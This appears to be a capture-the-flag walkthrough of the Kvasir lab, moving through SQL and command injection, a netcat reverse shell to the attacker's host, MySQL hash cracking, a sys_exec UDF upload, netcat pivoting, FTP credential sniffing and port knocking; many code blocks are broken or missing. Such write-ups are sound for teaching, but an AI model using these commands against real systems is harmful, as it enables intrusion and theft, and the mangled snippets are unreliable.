<p>I made a few attempts at guessing a login, and eventually just threw a <code>'</code> at the username field:</p>

<p><img class="<a" src="href="https://i.imgur.com/gVb0iK7.png">https://i.imgur.com/gVb0iK7.png</a>"></p>

<p>I had a instant troll alert and figured it can&rsquo;t be <em>that</em> easy!? Changing the username payload from <code>'</code> to <code>' OR 1=1 LIMIT 1--</code> with a random word as a password, resulted in the application returning a <code>403</code> type response. I figured that something strange was going on here, and fired up <a href="http://portswigger.net/burp/">Burp Suite</a> to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:</p>

<p><img class="<a" src="href="https://i.imgur.com/mAxhkaG.png">https://i.imgur.com/mAxhkaG.png</a>"></p>

<p>Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered <code>bob:bob</code> with a DoB of <code>09/09/09</code>, and attempted to login with the credentials:</p>

<p><img class="<a" src="href="https://i.imgur.com/o9Utreq.png">https://i.imgur.com/o9Utreq.png</a>"></p>

<p>Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as <code>'a', 'a', 0, NULL)</code>. Considering this was a new account registration page, my guess was that this was part of a <code>INSERT</code> query:</p>

<p><img class="<a" src="href="https://i.imgur.com/DA1Xe5H.png">https://i.imgur.com/DA1Xe5H.png</a>"></p>

<p>It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &lsquo;ol <code>wfuzz</code> on the web service to see if there was anything interesting to reveal:</p>

<p>```bash

```</p>

<p>Woa, thats quite a bit of results to work through eh :)</p>

<h2>admins only want to 302 here</h2>

<p>Of everything <code>wfuzz</code> revealed to us, <code>admin.php</code> was the most interesting one. Watching Burp as the requests went up and down, I noticed that <code>admin.php</code> would return a HTTP 302 code with a location, along with an actual body:</p>

<p><img class="<a" src="href="https://i.imgur.com/exdmq5A.png">https://i.imgur.com/exdmq5A.png</a>"></p>

<p>Sweet! I modified the response in Burp to return <code>200</code> instead, and removed the <code>Location:</code> header. We now had a new page to work with :)</p>

<p><img class="<a" src="href="https://i.imgur.com/6WoT1x2.png">https://i.imgur.com/6WoT1x2.png</a>"></p>

<p>The form hints that we can check the service status of daemons running on the underlying OS, and suggests <code>apache2</code> as input. I submitted the form with <code>apache2</code> as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section <code>Apache2 is running (pid 1330).</code>. This just <strong>screams</strong> command injection doesn’t it?</p>

<h2>command injection</h2>

<p>In order for me to fuzz this further, I took the request to trusty &lsquo;ol <code>curl</code>. While doing this, I realized that <code>admin.php</code> did no checks to ensure that we are authenticated or anything. We could simply submit <code>service=&lt;payload&gt;</code> as a POST to <code>admin.php</code> and get output:</p>

<p>```bash
root@kali:~# curl &lsquo;<a href="http://192.168.56.102/admin.php">http://192.168.56.102/admin.php</a>&rsquo; &mdash;data &lsquo;service=apache2;&rsquo;</p>

<p><html>
<body></p>

<p><div align="center"></p>

<p><h1>Service Check</h1></p>

<p><form name="service" method="post" action="">
<input name="service" id="service" type="text" placeholder="apache2" /><br /><br />
<input name="submit" id="submit" type="submit" value="Submit" />
</form></p>

<p><form action="logout.php" method="post">
<input type="submit" value="Logout" />
</form></p>

<p><pre>Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
</pre>
```</p>

<p>Entering <code>apache2;</code> as the input, revealed the first step in our command injection. With <code>apache2;</code> as the payload, I figured that the php script was taking our user input and running with the following pseudo code:</p>

<p>```php
&lt;?php</p>

<p>print system(&ldquo;/etc/init.d/&rdquo; . $_POST[&ldquo;service&rdquo;] . &ldquo; status&rdquo;);
```</p>

<p>So, with our payload, we have modified this to run <code>/etc/init.d/apache2; status</code>, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting <code>service=</code> as <code>;echo 'id';</code> where the single quotes are actually back ticks. (octopress grrr)</p>

<p><code>``bash
root@kali:~# curl 'http://192.168.56.102/admin.php' --data 'service=;echo</code>id`;'</p>

<p>[&hellip; snip &hellip;]</p>

<p><pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```</p>

<h2>netcat is our entry into the rabbit hole</h2>

<p>With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&rsquo;d out. This ended up as the following python script:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir Command Execution</h1>

<h1>$ python cmd.py &ldquo;uname -a&rdquo;</h1>

<h1>Command to run: uname -a</h1>

<h1></h1>

<h1>Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux</h1>

<p>import requests
import re
import sys
import os
import binascii</p>

<p>print &lsquo;Command to run: %s&rsquo; % sys.argv[1]</p>

<h1>generate 2 random strings so that we can regex out the command output</h1>

<p>command_start = binascii.b2a_hex(os.urandom(30))
command_end = binascii.b2a_hex(os.urandom(30))</p>

<h1>prepare something that we can regex out</h1>

<p>params = {&lsquo;service&rsquo; : &lsquo;;echo %s; echo <code>%s</code>; echo %s;&rsquo; % (command_start, sys.argv[1], command_end) }</p>

<h1>fetch, ignoring the troll redirect</h1>

<p>r = requests.post(&lsquo;<a href="http://192.168.56.102/admin.php">http://192.168.56.102/admin.php</a>&rsquo;, params, allow_redirects=False)</p>

<h1>match regex and print</h1>

<p>print  re.findall(r'%s([^|]+)%s' % (command_start, command_end), r.text)[0].replace(&lsquo;\n%s\n&rsquo; % command_end,&lsquo;&rsquo;)
```</p>

<p>So, now I can just run <code>python cmd.py "id"</code> and get the output (the <em>(kvasir)</em> in front of my prompt is my python virtualenv where I installed the <code>requests</code> dependency):</p>

<p>```bash
(kvasir)root@kali:~# python cmd.py &ldquo;id&rdquo;
Command to run: id</p>

<p>uid=33(www-data) gid=33(www-data) groups=33(www-data)
```</p>

<p>And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. <strong>192.168.1.100</strong> and <strong>192.168.2.100</strong>. No sign of <strong>192.168.56.102</strong> here&hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with <code>nc -lvp 4444</code>, and connected to it using my <code>cmd.py</code> script <code>python cmd.py "/bin/nc 192.168.56.101 4444 -e /bin/bash"</code>:</p>

<p><code>bash
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53516
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></p>

<p>So, in order to make sure we don&rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host <code>web</code>:</p>

<p><img class="<a" src="href="https://i.imgur.com/Q2rSi2G.png">https://i.imgur.com/Q2rSi2G.png</a>"></p>

<p>The only public presence of the internal network is therefore the originally discovered <strong>192.168.56.102</strong> IP address.</p>

<h2>my-see-qual as root deserves a slap on the wrist</h2>

<p>With semi interactive shell access using <code>netcat</code> to <strong>web</strong> (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from <code>member.php</code>:</p>

<p>```php
&lt;?php</p>

<p>session_start();</p>

<p>if (!isset($_SESSION[&ldquo;member&rdquo;])) {</p>

<pre><code>header("Location: index.php");
</code></pre>

<p>}</p>

<p>$user = $_SESSION[&ldquo;username&rdquo;];</p>

<p>mysql_connect(&ldquo;192.168.2.200&rdquo;, &ldquo;webapp&rdquo;, &ldquo;webapp&rdquo;) or die(mysql_error());
mysql_select_db(&ldquo;webapp&rdquo;) or die(mysql_error());</p>

<p>$query = &ldquo;SELECT dob FROM users WHERE username=&lsquo;$user&rsquo;&rdquo;;
$result = mysql_query($query) or die(mysql_error());</p>

<p>?>
[&hellip; snip &hellip;]
```</p>

<p>So mysql access with <code>webapp:webapp</code> at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'show grants;'
Grants for webapp@192.168.2.100
GRANT SELECT, INSERT ON *.* TO 'webapp'@'192.168.2.100' IDENTIFIED BY PASSWORD '*BF7C27E734F86F28A9386E9759D238AFB863BDE3'
GRANT ALL PRIVILEGES ON `webapp`.* TO 'webapp'@'192.168.2.100'
</code></p>

<p>So I can select anywhere. Nice :)</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; show tables;'
Tables_in_webapp
todo
users
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; select * from todo;'
task
stop running mysql as root
</code></p>

<p>A table called <code>todo</code> exists, with a string <code>stop running mysql as root</code>. That was the first hint and immediately had me thinking about <a href="http://www.mysqludf.org/">MySQL UDF</a>&rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use mysql; select DISTINCT User,Password from user;'
User    Password
root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
</code></p>

<p>As a side note, further enumeration of the PHP sources and MySQL table <code>users</code> showed that if we injected SQL on the registration page to add a extra <code>1</code>, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.</p>

<h3>cracking root&rsquo;s MySQL password</h3>

<p>Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used <code>hashcat</code> with the ever famous <code>rockyou</code> wordlist:</p>

<p>```bash</p>

<h1>first, echo the hash to a file</h1>

<p>root@kali:~# echo &ldquo;ECB01D78C2FBEE997EDA584C647183FD99C115FD&rdquo; > db.root</p>

<h1>next, we tell hash cat the type of hash we have and wait a few seconds :)</h1>

<p>root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt
This copy of hashcat will expire on 01.01.2015. Please upgrade to continue using hashcat.</p>

<p>Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size&hellip;</p>

<p>NOTE: press enter for status-screen</p>

<p>ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater</p>

<p>All hashes have been recovered</p>

```</p>

<p>The password for the MySQL <code>root</code> user is therefore <code>coolwater</code>:</p>

<p><code>bash
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'show grants;'
Grants for root@192.168.2.100
GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.2.100' IDENTIFIED BY PASSWORD '*ECB01D78C2FBEE997EDA584C647183FD99C115FD' WITH GRANT OPTION
</code></p>

<h3>loading the UDF remotely</h3>

<p>With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.</p>

<p>I grabbed a copy of a <code>do_system()</code> UDF that I have previously used successfully from <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">here</a>, called <code>raptor_udf.c</code>. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the <code>web</code> host. Compilation was done on the <code>web</code> host with:</p>

<p><code>bash
gcc -g -c raptor_udf.c -fPIC
gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
</code></p>

<p>This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word <code>uploading</code> sounds trivial, however its not. I need to know <em>where</em> to first. For this, I enumerate the MySQL <code>plugin_dir</code>:</p>

<p><code>bash
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select @@plugin_dir;'
@@plugin_dir
/usr/lib/mysql/plugin/
</code></p>

<p>So this means I need to write the udf to <code>/usr/lib/mysql/plugin/raptor_udf.so</code>. Fair enough. But how do I write this? Well there are many approaches to this. One is to use <code>--local-infile=1</code> as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the <strong>local</strong> file to wherever (a table in our case) and then to a file via <code>INTO DUMPFILE</code>. The other option is to simply convert the content to hex, and run <code>SELECT 0x</code> + <code>&lt;CONTENT AS HEX&gt;</code> + <code>INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so</code>.</p>

<p>I opted for the content encoding as hex and generated a <code>xxd</code> output of the compiled <code>raptor_udf.so</code>. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of <code>Undefined Symbol "do_system" in raptor_udf.so</code>. :\</p>

<p>Eventually, I opted to find a precompiled 64bit <code>.so</code> to upload, and found one in the <a href="https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so">sqlmap repository</a>. I downloaded this and converted it to hex using <code>xxd</code>. I then created the following file with the mysql commands to run on the <code>web</code> host from my attacking machine:</p>

<p>```bash
root@kali:~# cat load_udf.sh
touch log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &lsquo;use mysql; select 0x7f454</p>

<pre><code>[... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]
</code></pre>

<p>0000000000000 into dumpfile &ldquo;/usr/lib/mysql/plugin/raptor_udf.so&rdquo;;&lsquo; 2>> log
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'create function sys_exec returns integer soname &ldquo;raptor_udf.so&rdquo;;&rsquo; 2>> log

```</p>

<p>With this file ready, I opened a netcat port to pipe it to, and read it on <code>web</code>:</p>

<p>```bash</p>

<h1>on the attacking machine, I opened netcat with my mysql commands</h1>

<p>root@kali:~# nc -lvp 4444 &lt; load_udf.sh
listening on [any] 4444 &hellip;</p>

<h1>then on the original netcat shell I have, read it</h1>

```</p>

<p>The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of <code>0</code>, indicating that it was successful. I specify the <code>timeout</code> command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)</p>

<h2>ssh to db host</h2>

<p>With all that done, I have my public key for the <code>root</code> user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I <em>get</em> to 192.168.2.200&rsquo;s port 22? :)</p>

<p>For that, I decided to look at <code>netcat</code> port forwarding! But first, lets read some man pages:</p>

<p>```bash</p>

<h1>from nc(1)</h1>

<p>OPTIONS</p>

<pre><code>   -c string    specify shell commands to exec after connect (use with caution).
</code></pre>

<p>```</p>

<p><em>&ldquo;use with caution&rdquo;</em>. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!</p>

<p><img class="<a" src="href="https://i.imgur.com/7IggbMC.jpg">https://i.imgur.com/7IggbMC.jpg</a>"></p>

<p>Lets see this in action. First I setup the initial listener on the attacking machine:</p>

<p>```bash</p>

<h1>listen on tcp/4444, re-listening on tcp/222 on a new connection</h1>

<p>root@kali:~# nc -lvp 4444 -c &ldquo;nc -lvp 222&rdquo;
listening on [any] 4444 &hellip;
```</p>

<p>With the listener setup, lets issue a new <code>nc</code> command in the initial shell that I got on <code>web</code>, connecting the dots:</p>

<p><code>bash
nc 192.168.56.101 4444 -c "nc 192.168.2.200 22"
</code></p>

<p>When this runs, the initial listener will see the new connection, and I should have the <code>tcp/22</code> of <strong>192.168.2.200</strong> now forwarded locally:</p>

<p>```bash
root@kali:~# nc -lvp 4444 -c &ldquo;nc -lvp 222&rdquo;
listening on [any] 4444 &hellip;</p>

<h1>connection comes in from 192.168.1.100</h1>

<p>192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53870
listening on [any] 222 &hellip;
```</p>

<p>Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:</p>

<p><img class="<a" src="href="https://i.imgur.com/A2463Kc.png">https://i.imgur.com/A2463Kc.png</a>"></p>

<p>Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:</p>

<p>```bash

<p>I added the <code>-D</code> option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a <em>almost</em> <em>direct</em> connection to the <code>db</code> (192.168.2.200) host, as denoted in green below:</p>

<p><img class="<a" src="href="https://i.imgur.com/wHNJJ5g.png">https://i.imgur.com/wHNJJ5g.png</a>"></p>

<p>8-)</p>

<h2>not exactly nsa level spying but heh</h2>

<p>Initial enumeration revealed that this host (<code>db</code>) had 2 network interfaces. One with IP <strong>192.168.2.200</strong> (the one I came in from), and another with IP <strong>192.168.3.200</strong>. There were also 2 entries in <code>/etc/hosts</code> about 2 hosts in the 3.x network:</p>

<p>```bash
root@db:~# cat /etc/hosts</p>

<h1>192.168.3.40  celes</h1>

<h1>192.168.3.50  terra</h1>

<p>[&hellip; snip &hellip;]
```</p>

<p>The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:</p>

<p><code>bash

</code></p>

<p>A interesting file was in <code>/root/.words.txt</code>, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.</p>

<p><code>bash
root@db:~# head /root/.words.txt
borne
precombatting
noncandescent
cushat

precensure

</code></p>

<p>And finally, a troll flag :D</p>

<p><code>bash
root@db:~# cat /root/flag
This is not the flag you're looking for... :p
</code></p>

<p>This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user <code>celes</code> in <code>/etc/pure-ftpd/pureftpd.passwd</code>, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.</p>

<p>At one stage, I was checking to see what network activity was present on the interfaces, of which <code>eth0</code> had my SSH session, and <code>eth1</code> was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:</p>

<p>```bash
root@db:~# tcpdump -i eth1

<p>A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the <code>-W</code> flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.</p>

<p><img class="<a" src="href="https://i.imgur.com/YiwWzsy.png">https://i.imgur.com/YiwWzsy.png</a>"></p>

<p>It seems like <code>celes</code> is simply logging in, getting a directory listing, and logging out.</p>

<p>Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to <strong>192.168.3.40</strong> (the ip the FTP conversation was coming from) using <code>celes:im22BF4HXn01</code>:</p>

<h2>finding terras secret</h2>

<p>Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:</p>

<p><img class="<a" src="href="https://i.imgur.com/nXpoEBM.png">https://i.imgur.com/nXpoEBM.png</a>"></p>

<p>I don’t have connectivity directly to <strong>192.168.3.40</strong> at the moment, but if I really need that I can arrange it. For now, lets see what we have on <code>dev1</code>.</p>

<p>First, I find the sneaky ftp session script <code>getLogs.py</code>, that does exactly that which I saw in the packet captures. Next, I find a message in <code>celes</code> mailbox:</p>

<p>```bash
celes@dev1:~$ cat /var/spool/mail/celes

<p>Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine&hellip; <em>sigh</em>
```</p>

<p>The message reveals that Terra has a puzzle on her machine (<strong>192.168.3.50</strong> from <code>/etc/hosts</code> on the <code>db</code> server?). She also mentions <code>kvasir.png</code>, which happens to be in <code>celese</code> home directory:</p>

<p><code>bash
celes@dev1:~$ ls -lah kvasir.png
-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
</code></p>

<p>Lastly, the <code>.bash_history</code> for <code>celese</code> has a entry <code>stepic --help</code>. <code>stepic</code> is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&rsquo;s machine. So, I converted the <code>kvasir.png</code> image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using <code>xxd -r -p kvasir.png.xxd &gt; kvasir.png</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/DKIbriL.png">https://i.imgur.com/DKIbriL.png</a>"></p>

<h3>getting stepic to play nice</h3>

<p>With the image ready, I searched for <code>stepic</code> using <code>pip</code> in my virtual env and installed it:</p>

<p>```bash
(kvasir)root@kali:~# pip install stepic
Downloading/unpacking stepic
  Downloading stepic-0.4%7ebzr.tar.gz
  Running setup.py egg_info for package stepic</p>

<p>Installing collected packages: stepic
  Running setup.py install for stepic</p>

<pre><code>changing mode of build/scripts-2.7/stepic from 644 to 755

changing mode of /root/kvasir/bin/stepic to 755
</code></pre>

<p>Successfully installed stepic
Cleaning up&hellip;
```</p>

<p>However, <code>stepic</code> was not just a case of plug and play for me. <strong>NOPE</strong>:</p>

<p>```bash
(kvasir)root@kali:~# stepic
Traceback (most recent call last):
  File &ldquo;/root/kvasir/bin/stepic&rdquo;, line 24, in <module></p>

<pre><code>import Image
</code></pre>

<p>ImportError: No module named Image
```</p>

<p>Long story short, a small hack and installation of another dependency finally got it working for me:</p>

<p>```bash
(kvasir)root@kali:~# pip install pillow
Downloading/unpacking pillow
  Downloading Pillow-2.6.1.tar.gz (7.3Mb): 7.3Mb downloaded
  Running setup.py egg_info for package pillow</p>

<pre><code>Single threaded build, not installing mp_compile: 1 processes
</code></pre>

<p>[&hellip; snip &hellip;]</p>

<pre><code>*** OPENJPEG (JPEG2000) support not available
--- ZLIB (PNG/ZIP) support available
</code></pre>

<p>[&hellip; snip &hellip;]</p>

<p>Successfully installed pillow
Cleaning up&hellip;
```</p>

<p>The final hack was to change the installed <code>stepic</code> bin at <code>/root/kvasir/bin/stepic</code> line 24 from <code>import Image</code> to <code>from PIL import Image</code>. Finally, <code>stepic</code> was working fine.</p>

<h3>finding the secret</h3>

<p>With <code>stepic</code> up and running, I was finally able to run it against the image <code>kvasir.png</code>:</p>

<p>```bash
(kvasir)root@kali:~# stepic &mdash;decode &mdash;image-in=kvasir.png &mdash;out=out</p>

df9bb4ae0a3dc20000000049454e44ae426082
```</p>

<p>At this stage I was pretty convinced my hacks to get <code>stepic</code> to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.</p>

<p>Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of <code>decode()</code> methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:</p>

<p>```bash

<p>Decoding it as <code>hex</code> revealed the part I needed to see&hellip; <code>PNG</code>! So this string was a hex encoded PNG image (unless thats a troll too&hellip;). I took <code>out</code> and reversed it using <code>xxd -r -p</code>:</p>

<p><code>bash
root@kali:~# xxd -p -r out &gt; kvasir2.png
root@kali:~# file kvasir2.png
kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
</code></p>

<p>Lets see what the image looks like:</p>

<p><img class="<a" src="href="https://i.imgur.com/r0wxCYh.png">https://i.imgur.com/r0wxCYh.png</a>"></p>

<p>A QR code! I fetched my phone and scanned it, revealing the string <code>Nk9yY31hva8q</code>. Great!&hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for <code>dev1</code> either.</p>

<h2>playing Terra&rsquo;s game</h2>

<p>Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&rsquo;s game as per the email. From the <code>/etc/hosts</code> on <code>db</code>, I saw a comment for <code>terra</code> as <strong>192.168.3.50</strong>. Using the SSH socks proxy on <code>tcp/8000</code> I setup when I setup the SSH session to <strong>192.168.2.200</strong>, I nmapped <strong>192.168.3.50</strong>.</p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<p>Well <code>tcp/4444</code> looks interesting! Lets have a look!</p>

Hello Celes &amp; Welcome to the Jumble!</p>

Just a bit embarrasing really&hellip;
```</p>

<p>Don&rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the <em>Solve:</em> as ones that are scrambled from the previously found <code>.words.txt</code> file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from <code>.words.txt</code>. With the <code>.words.txt</code> file locally available, I slapped together something to try and do this:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir Terra Puzzle Solver</h1>

<p>import sys
import socket
import base64</p>

<h1>read the words.txt we got into a list</h1>

<p>with open(&lsquo;words.txt&rsquo;) as f:</p>

<pre><code>words = f.read().splitlines()
</code></pre>

<h1>connection to the game</h1>

<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&lsquo;192.168.3.50&rsquo;, 4444))</p>

<h1>start processing the lines</h1>

<p>while True:</p>

<pre><code># receive a frame large enough
frame = sock.recv(150)

# check that its a question frame
if 'Solve' not in frame:
    print "[!] 'Solve' not in frame. Game over?"
    break

# split the frame with :
frame = frame.split(':')
if len(frame) &lt; 2:
    print "[!] Was unable to split by :. Game over?"
    break

question = frame[1].strip()

# @barrebas suggested a length check too to increase probability :)
result = [s for s in words if not s.strip(question) and len(question) == len(s)]
#result = [s for s in words if not s.strip(question)]

if len(result) &lt; 1:
    print "[!] Was unable to match anything to %s" % question
    continue

answer = result[0].strip()

print "[+] Matched %s to %s" % (question, answer)
sock.send(answer)
</code></pre>

<h1>did we win? \:D/</h1>

<p>if &lsquo;You\&rsquo;re a winner&rsquo; in frame:</p>

<pre><code>print "[+] We won!"

# read the rest of the socket output
frame += sock.recv(2500)

# base64 decode the last string
print "[+] Extracing and decoding the base64 section"
print base64.b64decode(frame.split('\n')[-1])
sys.exit(0)
</code></pre>

<p>sock.close</p>

<h1>work with what we have left</h1>

<p>print &ldquo;[+] Last frame was:\n %s&rdquo; % frame
print &ldquo;[+] Done&rdquo;
sys.exit(0)
```</p>

<p>Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the <code>base64.b64decode(frame.split('\n')[-1])</code> section to the script so that if you win it will print the cleartext version.</p>

<p>The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:</p>

<p>```bash
root@kali:~# proxychains ./play.py

<p>Considering that <strong>192.168.3.50</strong> was named as <code>terra</code> in that <code>/etc/hosts</code> file, I attempted authentication using this key on it:</p>

Hi Terra,</p>

<p>I&rsquo;ve been playing with a port knocking daemon on my PC &ndash; see if you can use that to get a shell.
Let me know how it goes.</p>

<p>Regards,
Locke
```</p>

<p>Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on <strong>192.168.4.100</strong></p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<h1>socks5    127.0.0.1 8001</h1>

<h1>scans will appear to be coming from 192.168.4.50 for</h1>

<h1>192.168.4.100</h1>

<p>root@kali:~# proxychains nmap -sT 192.168.4.100

<p>Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
```</p>

<p>Only <code>tcp/22</code>. :s</p>

<p>I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a> (<code>knockd</code>), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file <a href="https://github.com/jvinet/knock/blob/master/knockd.conf">here</a>, which revealed the default sequence of: <code>7000,8000,9000</code>. So, I tested this by attempting to connect with <code>nc</code> to these ports on <strong>192.168.4.100</strong>, and following up with a nmap:</p>

<p><code>bash
terra@dev2:~$ nc -v 192.168.4.100 7000 -w 1; nc -v 192.168.4.100 8000 -w 1; nc -v 192.168.4.100 9000 -w 1

(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
terra@dev2:~$
</code></p>

<p>The nmap after the knock:</p>

<p>```bash
root@kali:~# proxychains nmap -sT 192.168.4.100

```</p>

<p>Shell access as <code>locke</code> on <strong>192.168.4.100</strong>. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&hellip; The new connection denoted in red again:</p>

<h2>busting kefka</h2>

<p>The shell on <code>adm</code> as <code>locke</code> was nothing more than a <code>/bin/sh</code> instance executed over <code>netcat</code>. This can be seen in the <code>littleShell.sh</code> file in <code>/home/locke</code>:</p>

<p>```bash
cat littleShell.sh</p>

<p>/bin/nc -lnp 1111 -e &lsquo;/bin/sh&rsquo;

<p>Other interesting files were all in <code>locke</code>&rsquo;s home directory:</p>

<p>The <code>note.txt</code> file:</p>

<p><code>bash
cat note.txt
Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
</code></p>

<p>Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the <code>diskimage.tar.gz</code> file to progress. The first thing I had to do was get a local copy of <code>diskimage.tar.gz</code>. Out comes <code>netcat</code> again :) I hosted the file on <code>tcp/4444</code> on <strong>192.168.4.100</strong> with <code>nc -lvp 4444 &lt; diskimage.tar.gz | xxd -p</code>. I then read the file on my attacking machine with <code>timeout 5 proxychains nc 192.168.4.100 4444 &gt; diskimage.tar.gz</code> (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).</p>

<p>I had to carve out the string <em>ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</em> out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple <code>dd</code> on the top line and it was gone :)</p>

<p>I then extracted the archive and ran the resultant archive through <code>file</code>:</p>

<p>```bash
root@kali:~# tar xvf diskimage.tar.gz
diskimage</p>

<p>root@kali:~# file -k diskimage
diskimage: x86 boot sector, code offset 0x3c, OEM-ID &ldquo;MSDOS5.0&rdquo;, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes > 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit) DOS executable (COM), boot code
```</p>

